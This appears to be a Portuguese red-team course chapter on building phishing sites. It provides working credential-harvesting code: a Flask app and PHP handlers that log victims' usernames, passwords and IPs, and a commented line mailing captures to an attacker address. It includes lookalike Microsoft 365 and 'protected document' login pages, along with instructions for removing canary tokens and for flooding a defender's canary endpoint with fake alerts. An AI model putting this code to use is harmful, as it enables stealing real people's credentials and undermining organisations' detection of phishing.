---
title: "Phishing Page Creation"
---

# 03. Criação de Páginas de Phishing

## Templates Públicos São Assinados: Construir é Obrigatório

Templates públicos do GitHub são altamente assinados. Clones de sites populares são detectados por análise visual. Construir páginas customizadas ou clonar e modificar substancialmente é essencial para sobrevivência da campanha.

---

## Flask — Framework Web para Phishing

### Conceitos Fundamentais

```python
# app.py — estrutura básica Flask
from flask import Flask, request, redirect, render_template

app = Flask(__name__)

# Rota GET (página de login)
@app.route('/')
def home_page():
    return render_template('login.html')

# Rota POST/GET (logging de credenciais)
@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        # Log credenciais
        with open('/tmp/creds.txt', 'a') as f:
            f.write(f"{username}:{password}\n")
        return redirect('https://google.com')
    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='127.0.0.1')
```

### Routing com Métodos HTTP

```python
from flask import Flask, request

app = Flask(__name__)

# Suporta GET e POST
@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        # Processar formulário
        username = request.form['username']
        return f"Recebido: {username}"
    else:
        return "Formulário de login"
```

### Variáveis de Rota

```python
@app.route('/user/<username>')
def user_profile(username):
    return f'Perfil de {username}'

@app.route('/item/<int:item_id>')
def get_item(item_id):
    return f'Item ID: {item_id}'
```

### Render Templates

```python
from flask import render_template

@app.route('/')
def index():
    data = {
        'title': 'Login',
        'company': 'Acme Corp'
    }
    return render_template('index.html', **data)
```

Template (`templates/index.html`):
```html
<h1>{{ title }}</h1>
<p>{{ company }}</p>
```

### Gerenciamento de Sessões com Cookies

```python
from flask import session

app.secret_key = 'chave_secreta_aqui'

@app.route('/login', methods=['POST'])
def login():
    session['user'] = request.form['username']
    return redirect('/')

@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect('/login')
    return f"Logado como {session['user']}"
```

---

## Clonagem de Sites

### Por Que Clonar? (e Riscos)

**Vantagens**: rapidez de desenvolvimento, site visualmente idêntico.

**Desvantagens e riscos**:
- Sites populares (Microsoft, Google, Facebook) são detectados por análise visual (fingerprint visual).
- Organizações sofisticadas embeds canary tokens nos login pages.
- HTML complexo com JavaScript que verifica domínio pode disparar alertas automaticamente.
- Fontes, imagens e scripts carregados de domínios legítimos expõem o servidor de phishing ao dono legítimo.

### Clonagem com SingleFile (Browser Extension)

**SingleFile** (disponível em Chrome, Firefox, Safari, Edge) baixa toda a página + assets em um único `.html`.

Processo:
1. Navegar para o site-alvo.
2. Clicar na extensão SingleFile.
3. O arquivo `.html` é baixado automaticamente.

Sites testados:
- **Instagram** — quase perfeito, mas animações de imagem e pontos do campo de senha não funcionam.
- **Office.com** — clone quase exato.
- **Microsoft 365 Login** — clone quase perfeito.

### Detecção de Clonagem via JavaScript (Canary Tokens)

Organizações embeds scripts que detectam quando a página é carregada em domínio diferente:

```javascript
// Versão não-ofuscada (Thinkst Canary)
if (!(window.location.hostname === "inyoni-corp.com" ||
      window.location.hostname === "inyoni-corp.com.") && !
    (window.location.hostname.endsWith(".inyoni-corp.com") ||
     window.location.hostname.endsWith(".inyoni-corp.com."))) {
    let l = location.href;
    let r = document.referrer;
    let m = new Image();
    m.src = "https://a0c6a66e5eb9.o3n.io/images/ftdxnos9seunytkd6imv5uaf8/logo.gif?l="
            + encodeURI(l) + "&r=" + encodeURI(r);
}
```

O script dispara requisição para endpoint de alerta quando carregado em domínio diferente → defensor recebe URL do site de phishing.

**Versão obfuscada**: mesmo código mas com ofuscação JavaScript (string arrays + encodings) → difícil de identificar e remover.

**Mitigação (atacante)**: remover manualmente o script após clonar. Difícil quando obfuscado em arquivo grande.

### Detecção de Clonagem via CSS

```css
/* Canary token via URL em CSS background */
body {
    background: url('https://dakg4cmpuclai.cloudfront.net/t8x0g9q8yo5t24hnhgsgus6mm/c2FtcGxlLmNvbQ%3D%3D/img.gif') !important;
}
```

Administrador do servidor monitora quem faz requisições à imagem → expõe domínio de phishing.

**Mitigação**: remover qualquer URL externa em propriedades `background` do CSS.

### Criando Alertas Falsos (Contra-Ataque)

Se canary token detectado, possível criar alertas falsos para overwhelm defensores:

```javascript
function sendFakeAlert(customDomain, customReferrer) {
    let l = "https://" + customDomain;
    let r = "https://" + customReferrer;
    let m = new Image();
    let requestURL = "https://a0c6a66e5eb9.o3n.io/images/ftdxnos9seunytkd6imv5uaf8/logo.gif?" +
                     "l=" + encodeURIComponent(l) + "&r=" + encodeURIComponent(r);
    m.src = requestURL;
}

// Enviar múltiplos alertas falsos
for (let i = 0; i < 100; i++) {
    sendFakeAlert("fake-phishing-" + i + ".com", "google.com");
}
```

---

## Criação de Páginas Customizadas

### Conceito: Documento Protegido com Blur

Pretext popular: documento que requer login para visualizar.

**Passos**:
1. Encontrar imagem adequada (PDF público com logo da empresa-alvo):
   ```
   ext:pdf site:google.com report
   ```
2. Desfocar a imagem (BeFunky.com ou GIMP) — logo visível, texto ilegível.
3. Construir página com imagem no background.

**Exemplo de estrutura HTML**:
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Protected Document</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: url('blurred-doc.png') no-repeat center center;
            background-size: cover;
        }
        .overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
        }
        .login-box {
            position: relative;
            background: white;
            padding: 30px;
            border-radius: 8px;
            width: 320px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="login-box">
        <h2>Sign in to view document</h2>
        <form action="submit.php" method="POST">
            <input type="email" name="username" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
```

### Microsoft 365 Customizado

Página diferente visualmente do login Microsoft original mas que induz usuário a inserir credenciais Microsoft:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Account Sign-In</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f3f2f1; }
        .container {
            max-width: 440px; margin: 80px auto;
            background: white; padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo { margin-bottom: 20px; }
        h2 { font-size: 24px; font-weight: 300; }
        input {
            width: 100%; padding: 8px 0;
            border: none; border-bottom: 1px solid #666;
            font-size: 15px; margin: 12px 0;
            outline: none;
        }
        .btn {
            background: #0067b8; color: white;
            padding: 12px; width: 100%;
            border: none; font-size: 15px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Logo Microsoft ou logo do fornecedor -->
            <img src="ms-logo.png" height="24">
        </div>
        <h2>Sign in</h2>
        <form action="submit.php" method="POST">
            <input type="text" name="username" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn">Sign in</button>
        </form>
    </div>
</body>
</html>
```

---

## Integração de Funcionalidade Backend (PHP)

### Formulário HTML com Action

```html
<form action="submit.php" method="POST">
    <div>
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
    </div>
    <div>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
    </div>
    <button type="submit">Login</button>
</form>
```

### Submit Handler (submit.php)

```php
<?php

// Sanitização básica
function sanitize($input) {
    return htmlspecialchars(strip_tags(trim($input)));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = sanitize($_POST['username'] ?? '');
    $password = sanitize($_POST['password'] ?? '');
    
    // Coletar informações adicionais do cliente
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');
    
    // Log em arquivo
    $logEntry = "[$timestamp] IP: $ip | UA: $userAgent | User: $username | Pass: $password\n";
    file_put_contents('/var/www/html/logs/creds.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Opção: enviar por email (requer mail() configurado)
    // mail("attacker@protonmail.com", "New Cred", $logEntry);
    
    // Redirecionar para site legítimo após submissão
    header('Location: https://www.google.com');
    exit;
}

// Se GET, redirecionar para login page
header('Location: /');
exit;
?>
```

### Logging em MySQL

```php
<?php
require_once 'db_config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    
    // Prepared statement para evitar SQLi
    $stmt = $pdo->prepare("INSERT INTO credentials (username, password, ip, user_agent, captured_at) VALUES (?, ?, ?, ?, NOW())");
    $stmt->execute([$username, $password, $ip, $ua]);
    
    header('Location: https://microsoft.com');
    exit;
}
?>
```

---

## Validação de Input (Frontend + Backend)

### Identificar Política de Senhas do Alvo

Durante reconhecimento, identificar política de senhas da organização-alvo. Emular essa política no formulário de phishing para manter credibilidade.

**Exemplo**: organização exige email `@company.com`, senha ≥8 chars com número e caractere especial.

### Validação Frontend (JavaScript)

```javascript
function validateInputs() {
    var email = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    
    // Regex para @company.com
    var emailPattern = /^[a-zA-Z0-9._%+-]+@company\.com$/;
    // Regex: min 8 chars, pelo menos 1 número e 1 especial
    var passwordPattern = /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/;
    
    var submitButton = document.getElementById('submit-button');
    
    if (emailPattern.test(email) && passwordPattern.test(password)) {
        submitButton.disabled = false;
    } else {
        submitButton.disabled = true;
    }
}
```

Integração nos input fields:
```html
<input type="email" id="username" name="username" 
       oninput="validateInputs()" required>
<input type="password" id="password" name="password" 
       oninput="validateInputs()" required>
<button id="submit-button" type="submit" disabled>Login</button>
```

### Validação Backend (PHP)

Validação no servidor é obrigatória — frontend validation pode ser bypassada por qualquer atacante/scanner.

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Validação de email (formato @company.com)
    $emailPattern = '/^[a-zA-Z0-9._%+\-]+@company\.com$/i';
    if (!preg_match($emailPattern, $username)) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid email format']);
        exit;
    }
    
    // Validação de senha
    $passwordPattern = '/^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/';
    if (!preg_match($passwordPattern, $password)) {
        http_response_code(400);
        echo json_encode(['error' => 'Password does not meet requirements']);
        exit;
    }
    
    // Proteção contra SQLi: usar prepared statements
    // Proteção contra XSS: htmlspecialchars antes de exibir
    
    // Log credenciais
    $ip = $_SERVER['REMOTE_ADDR'];
    $log = date('Y-m-d H:i:s') . " | $username | $password | $ip\n";
    file_put_contents('/var/www/logs/creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Redirecionar
    header('Location: https://portal.company.com');
    exit;
}
?>
```

### Proteção contra SQL Injection

```php
<?php
// RUIM: vulnerável a SQLi
$query = "SELECT * FROM users WHERE user = '$username' AND pass = '$password'";

// BOM: prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE user = ? AND pass = ?");
$stmt->execute([$username, $password]);
```

---

## Análise de Segurança do Servidor

### Verificação de Portas Abertas

```bash
# Varredura local
nmap 127.0.0.1 -Pn -p- -sV

# Saída típica (deve ter apenas 22, 443):
# PORT   STATE SERVICE  VERSION
# 22/tcp open  ssh      OpenSSH 9.6p1 Ubuntu
# 80/tcp open  http     Apache httpd 2.4.58
# 443/tcp open ssl/http Apache httpd 2.4.58
```

### Informações Expostas nas Headers

Por padrão, Apache expõe:
```
Server: Apache/2.4.58 (Ubuntu)
```

Também em páginas de erro (404, 500).

### Verificar HTTP Response Headers

```bash
curl -I https://domain.com

# Deve remover/ofuscar: Server, X-Powered-By, X-AspNet-Version
```

---

## Configuração Segura do SSH

### Configurar Autenticação por Chave

```bash
# No cliente: gerar par de chaves
ssh-keygen -t rsa -b 4096

# Copiar chave pública para servidor
ssh-copy-id -i /path/to/id_rsa.pub root@server-ip

# Alternativa manual
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "CONTEUDO_DO_id_rsa.pub" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Desabilitar Autenticação por Senha

Editar `/etc/ssh/sshd_config`:
```
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin prohibit-password
```

Reiniciar SSH:
```bash
sudo systemctl restart sshd
```

### Reduzir Banner do SSH

Adicionar em `/etc/ssh/sshd_config`:
```
DebianBanner no
```

Reduz `OpenSSH 9.6p1 Ubuntu 3ubuntu13` para apenas versão básica.

---

## Leitura Complementar

- [SingleFile Browser Extension](https://github.com/gildas-lormeau/SingleFile)
- [Flask Documentation](https://flask.palletsprojects.com/)
- [Thinkst Canary - Cloning Detection](https://docs.canarytokens.org/guide/cloned-web-token.html)
- [RegExr - Regex Testing](https://regexr.com/)
- ATT&CK T1566.002 — Spearphishing Link
- ATT&CK T1056.003 — Web Portal Capture
